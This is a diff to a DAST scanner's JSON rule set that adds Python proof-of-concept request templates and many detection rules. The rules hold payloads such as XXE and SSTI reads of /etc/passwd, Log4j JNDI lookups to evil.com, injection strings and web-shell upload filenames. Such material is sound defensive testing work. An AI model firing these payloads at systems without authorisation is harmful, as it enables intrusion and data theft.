@@ -1,8 +1,8 @@
 {
   "name": "DAST Rule Set",
-  "version": "1.0",
+  "version": "3.0",
   "author": "Nilanjan Chowdhury",
-  "description": "Custom DAST rules for web application security testing",
+  "description": "Enterprise DAST rules for web application security testing — 22 vulnerability detection modules with PoC generation",
   "rules": [
     {
       "rule_id": "DAST-001",
@@ -11,6 +11,10 @@
       "severity": "Critical",
       "cwe": "CWE-89",
       "description": "Detects SQL injection vulnerabilities by injecting payloads that attempt to manipulate SQL queries.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nprint(f\"Status: {response.status_code}\")\nif \"{indicator}\" in response.text:\n    print(\"[!] Vulnerability confirmed!\")\nelse:\n    print(\"[+] No vulnerability detected.\")"
+      },
       "attack_vectors": [
         {
           "method": "GET",
@@ -41,18 +45,7 @@
           "Microsoft OLE DB",
           "PostgreSQL",
           "SQLite"
-        ],
-        "time_based": {
-          "payload": "' AND SLEEP(5)--",
-          "delay_ms": 5000
-        },
-        "error_based": {
-          "payload": "' AND 1=CONVERT(int, @@version)--",
-          "indicators": [
-            "Conversion failed",
-            "SQL error"
-          ]
-        }
+        ]
       }
     },
     {
@@ -62,6 +55,10 @@
       "severity": "High",
       "cwe": "CWE-79",
       "description": "Detects reflected and stored XSS vulnerabilities by injecting script payloads.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] XSS confirmed!\")\nelse:\n    print(\"[+] No XSS detected.\")"
+      },
       "attack_vectors": [
         {
           "method": "GET",
@@ -91,10 +88,7 @@
           "onerror=",
           "onload=",
           "javascript:"
-        ],
-        "reflected": {
-          "check": "Payload appears unencoded in response"
-        }
+        ]
       }
     },
     {
@@ -104,6 +98,10 @@
       "severity": "High",
       "cwe": "CWE-918",
       "description": "Detects SSRF vulnerabilities by attempting to access internal resources.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] SSRF confirmed!\")\nelse:\n    print(\"[+] No SSRF detected.\")"
+      },
       "attack_vectors": [
         {
           "method": "GET",
@@ -132,10 +130,7 @@
           "localhost",
           "internal",
           "metadata"
-        ],
-        "open_redirect": {
-          "check": "Payload URL appears in response or redirect"
-        }
+        ]
       }
     },
     {
@@ -145,6 +140,10 @@
       "severity": "High",
       "cwe": "CWE-22",
       "description": "Detects path traversal vulnerabilities by attempting to access sensitive files.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] Path Traversal confirmed!\")\nelse:\n    print(\"[+] No Path Traversal detected.\")"
+      },
       "attack_vectors": [
         {
           "method": "GET",
@@ -173,10 +172,7 @@
           "Administrator:",
           "127.0.0.1",
           "localhost"
-        ],
-        "file_content": {
-          "check": "File content appears in response"
-        }
+        ]
       }
     },
     {
@@ -186,6 +182,10 @@
       "severity": "Critical",
       "cwe": "CWE-78",
       "description": "Detects OS command injection vulnerabilities by injecting system commands.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] Command Injection confirmed!\")\nelse:\n    print(\"[+] No Command Injection detected.\")"
+      },
       "attack_vectors": [
         {
           "method": "GET",
@@ -216,11 +216,536 @@
           "root",
           "bin",
           "C:\\Windows\\System32"
-        ],
-        "time_based": {
-          "payload": "127.0.0.1; sleep 5",
-          "delay_ms": 5000
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-006",
+      "name": "XXE (XML External Entity) Detection",
+      "category": "XXE",
+      "severity": "Critical",
+      "cwe": "CWE-611",
+      "description": "Detects XML External Entity injection vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\ndata = {{\"{parameter}\": payload}}\n\nresponse = requests.post(target, data=data)\nif \"{indicator}\" in response.text:\n    print(\"[!] XXE confirmed!\")\nelse:\n    print(\"[+] No XXE detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "POST",
+          "parameter": "xml",
+          "payloads": [
+            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>",
+            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"http://169.254.169.254/\">]><root>&test;</root>"
+          ]
         }
+      ],
+      "detection": {
+        "response_indicators": [
+          "root:x:0:0",
+          "169.254.169.254",
+          "java.io.FileNotFoundException"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-007",
+      "name": "CSRF (Cross-Site Request Forgery) Detection",
+      "category": "CSRF",
+      "severity": "High",
+      "cwe": "CWE-352",
+      "description": "Detects missing or weak CSRF tokens in sensitive requests.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\ndata = {{\"{parameter}\": payload}}\n\nresponse = requests.post(target, data=data)\nif \"{indicator}\" in response.text:\n    print(\"[!] CSRF confirmed!\")\nelse:\n    print(\"[+] No CSRF detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "POST",
+          "parameter": "csrf_token",
+          "payloads": [
+            "missing",
+            "weak",
+            "static"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "csrf",
+          "token",
+          "_csrf"
+        ],
+        "missing_token": {
+          "check": "No CSRF token found in form or request"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-008",
+      "name": "JWT Weakness Detection",
+      "category": "JWT",
+      "severity": "High",
+      "cwe": "CWE-327",
+      "description": "Detects weak or misconfigured JWT implementations.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\nimport jwt\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nheaders = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, headers=headers)\nif \"{indicator}\" in response.text:\n    print(\"[!] JWT Weakness confirmed!\")\nelse:\n    print(\"[+] No JWT Weakness detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "Authorization",
+          "payloads": [
+            "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.INVALID"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "alg: none",
+          "invalid signature",
+          "jwt"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-009",
+      "name": "Open Redirect Detection",
+      "category": "Open Redirect",
+      "severity": "Medium",
+      "cwe": "CWE-601",
+      "description": "Detects open redirect vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params, allow_redirects=False)\nif \"{indicator}\" in response.headers.get(\"Location\", \"\"):\n    print(\"[!] Open Redirect confirmed!\")\nelse:\n    print(\"[+] No Open Redirect detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "redirect",
+          "payloads": [
+            "http://evil.com",
+            "//evil.com",
+            "https://evil.com",
+            "http://localhost:8080/evil"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "Location: http://evil.com",
+          "redirected to evil.com"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-010",
+      "name": "IDOR (Insecure Direct Object Reference) Detection",
+      "category": "IDOR",
+      "severity": "High",
+      "cwe": "CWE-639",
+      "description": "Detects IDOR vulnerabilities by changing object references.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] IDOR confirmed!\")\nelse:\n    print(\"[+] No IDOR detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "id",
+          "payloads": [
+            "1",
+            "2",
+            "3",
+            "admin",
+            "1000"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "user",
+          "profile",
+          "order",
+          "invoice",
+          "document"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-011",
+      "name": "LDAP Injection Detection",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-90",
+      "description": "Detects LDAP injection vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] LDAP Injection confirmed!\")\nelse:\n    print(\"[+] No LDAP Injection detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "user",
+          "payloads": [
+            "*",
+            "admin*",
+            "*)(&)",
+            "admin)(&",
+            ")(uid=*"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "LDAP",
+          "Search returned",
+          "Invalid DN syntax"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-012",
+      "name": "XPATH Injection Detection",
+      "category": "Injection",
+      "severity": "High",
+      "cwe": "CWE-643",
+      "description": "Detects XPATH injection vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] XPATH Injection confirmed!\")\nelse:\n    print(\"[+] No XPATH Injection detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "query",
+          "payloads": [
+            "' or '1'='1",
+            "' or ''='",
+            "//*",
+            "admin' or '1'='1"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "XPATH",
+          "Invalid expression",
+          "xml"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-013",
+      "name": "Host Header Injection Detection",
+      "category": "Host Injection",
+      "severity": "Medium",
+      "cwe": "CWE-644",
+      "description": "Detects Host header injection vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nheaders = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, headers=headers)\nif \"{indicator}\" in response.text:\n    print(\"[!] Host Header Injection confirmed!\")\nelse:\n    print(\"[+] No Host Header Injection detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "Host",
+          "payloads": [
+            "evil.com",
+            "localhost:8080",
+            "127.0.0.1",
+            "attacker.com"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "evil.com",
+          "attacker.com"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-014",
+      "name": "NoSQL Injection Detection",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-943",
+      "description": "Detects NoSQL injection vulnerabilities in MongoDB, Cassandra, etc.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] NoSQL Injection confirmed!\")\nelse:\n    print(\"[+] No NoSQL Injection detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "query",
+          "payloads": [
+            "{\"$ne\": null}",
+            "{\"$gt\": \"\"}",
+            "{\"$regex\": \".*\"}",
+            "admin' || '1'=='1"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "$ne",
+          "$gt",
+          "$regex",
+          "MongoError"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-015",
+      "name": "Unrestricted File Upload Detection",
+      "category": "File Upload",
+      "severity": "High",
+      "cwe": "CWE-434",
+      "description": "Detects unrestricted file upload vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nfiles = {{\"{parameter}\": (payload, \"test\")}}\n\nresponse = requests.post(target, files=files)\nif \"{indicator}\" in response.text:\n    print(\"[!] File Upload confirmed!\")\nelse:\n    print(\"[+] No File Upload detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "POST",
+          "parameter": "file",
+          "payloads": [
+            "malicious.php",
+            "shell.jsp",
+            "cmd.asp",
+            "payload.aspx",
+            "backdoor.phtml",
+            "exploit.php.jpg"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "<?php",
+          "JSP",
+          "ASP",
+          "Upload successful",
+          "File uploaded"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-016",
+      "name": "Server-Side Template Injection (SSTI)",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-94",
+      "description": "Detects SSTI vulnerabilities in template engines.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] SSTI confirmed!\")\nelse:\n    print(\"[+] No SSTI detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "template",
+          "payloads": [
+            "{{7*7}}",
+            "${7*7}",
+            "{{config}}",
+            "{{self.__class__.__mro__[1].__subclasses__()}}",
+            "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "49",
+          "config",
+          "__class__",
+          "jinja",
+          "TemplateError"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-017",
+      "name": "HTTP Request Smuggling Detection",
+      "category": "HTTP",
+      "severity": "High",
+      "cwe": "CWE-444",
+      "description": "Detects HTTP request smuggling vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\n# HTTP Request Smuggling PoC requires raw HTTP request crafting\n# Use this script as a template to craft CL.TE/TE.CL requests\nprint(\"[!] Request Smuggling detected — manual PoC required.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "POST",
+          "parameter": "Transfer-Encoding",
+          "payloads": [
+            "CL.TE",
+            "TE.CL",
+            "TE.TE"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "500",
+          "Invalid request",
+          "Bad Gateway"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-018",
+      "name": "CORS Misconfiguration Detection",
+      "category": "CORS",
+      "severity": "Medium",
+      "cwe": "CWE-942",
+      "description": "Detects CORS misconfigurations allowing unauthorized domains.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\nheaders = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, headers=headers)\nif \"{indicator}\" in response.headers.get(\"Access-Control-Allow-Origin\", \"\"):\n    print(\"[!] CORS Misconfiguration confirmed!\")\nelse:\n    print(\"[+] No CORS Misconfiguration detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "Origin",
+          "payloads": [
+            "https://evil.com",
+            "http://attacker.com",
+            "null"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "Access-Control-Allow-Origin: https://evil.com",
+          "Access-Control-Allow-Origin: *"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-019",
+      "name": "Race Condition Detection",
+      "category": "Race Condition",
+      "severity": "High",
+      "cwe": "CWE-362",
+      "description": "Detects race condition vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\nfrom concurrent.futures import ThreadPoolExecutor\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\ndef send_request():\n    return requests.get(target, params=params)\n\nwith ThreadPoolExecutor(max_workers=5) as executor:\n    results = list(executor.map(lambda _: send_request(), range(5)))\n\nstatuses = [r.status_code for r in results]\nif len(set(statuses)) > 1:\n    print(\"[!] Race Condition confirmed!\")\nelse:\n    print(\"[+] No Race Condition detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "amount",
+          "payloads": [
+            "concurrent",
+            "parallel"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "insufficient funds",
+          "multiple requests",
+          "race condition"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-020",
+      "name": "GraphQL Injection Detection",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-943",
+      "description": "Detects GraphQL injection vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\ndata = {{\"{parameter}\": payload}}\nheaders = {{\"Content-Type\": \"application/json\"}}\n\nresponse = requests.post(target, json=data, headers=headers)\nif \"{indicator}\" in response.text:\n    print(\"[!] GraphQL Injection confirmed!\")\nelse:\n    print(\"[+] No GraphQL Injection detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "POST",
+          "parameter": "query",
+          "payloads": [
+            "{__schema{types{name}}}",
+            "query{__typename}",
+            "mutation{__typename}"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "__schema",
+          "__typename",
+          "GraphQL"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-021",
+      "name": "Log4j (CVE-2021-44228) Detection",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-917",
+      "description": "Detects Log4j JNDI injection vulnerability.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] Log4j confirmed!\")\nelse:\n    print(\"[+] No Log4j detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "user",
+          "payloads": [
+            "${jndi:ldap://evil.com/a}",
+            "${jndi:rmi://evil.com/a}",
+            "${jndi:dns://evil.com}"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "JNDI",
+          "LDAP",
+          "evil.com"
+        ]
+      }
+    },
+    {
+      "rule_id": "DAST-022",
+      "name": "Sensitive Data Exposure Detection",
+      "category": "Information Disclosure",
+      "severity": "Medium",
+      "cwe": "CWE-200",
+      "description": "Detects exposure of sensitive data in responses.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] Sensitive Data Exposure confirmed!\")\nelse:\n    print(\"[+] No Sensitive Data Exposure detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "debug",
+          "payloads": [
+            "true",
+            "1"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "password",
+          "secret",
+          "api_key",
+          "token",
+          "credit card",
+          "SSN"
+        ]
       }
     }
   ]
